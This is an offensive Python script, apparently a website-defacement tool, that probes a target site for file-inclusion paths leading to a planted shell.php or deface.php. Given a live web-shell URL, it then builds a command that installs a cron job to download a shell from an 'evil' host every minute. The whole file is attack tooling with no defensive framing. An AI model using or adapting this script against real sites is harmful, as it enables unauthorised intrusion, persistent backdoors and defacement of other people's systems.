#!/usr/bin/env python3
import requests
from colorama import Fore, init
init(autoreset=True)

def banner():
    print(f"""
{Fore.RED}
    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
    █ PERSISTENCE v1.0 - ROOT INDEX DEFACE                            █
    ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
    """)

def main():
    banner()
    target = input(f"{Fore.YELLOW}[?] Target root (ex: https://target.com): ").strip()
    
    # RFI payloads untuk include shell
    rfi_payloads = [
        f"{target}/index.php?page=../images/shell.php",
        f"{target}/?include=images/shell.php",
        f"{target}/index.php?file=../images/deface.php"
    ]
    
    print(f"{Fore.CYAN}\n🔗 PERSISTENCE VECTORS:\n")
    
    for payload in rfi_payloads:
        try:
            r = requests.get(payload, timeout=5)
            if r.status_code == 200:
                print(f"{Fore.GREEN}[+] PERSISTENT: {payload}")
                print(f"    Preview: {r.text[:80]}...")
        except:
            pass
    
    # Crontab persistence (jika shell live)
    shell_url = input(f"\n{Fore.YELLOW}[?] Live shell URL: ").strip()
    if shell_url:
        print(f"{Fore.GREEN}[CRON] Adding persistence...")
        cron_cmd = "echo '* * * * * wget -O /tmp/shell.php http://evil/shell.php' | crontab -"
        test_url = f"{shell_url}?cmd={cron_cmd}"
        print(f"{Fore.CYAN}→ {test_url}")

if __name__ == "__main__":
    main()
    input("\nPress ENTER to exit...")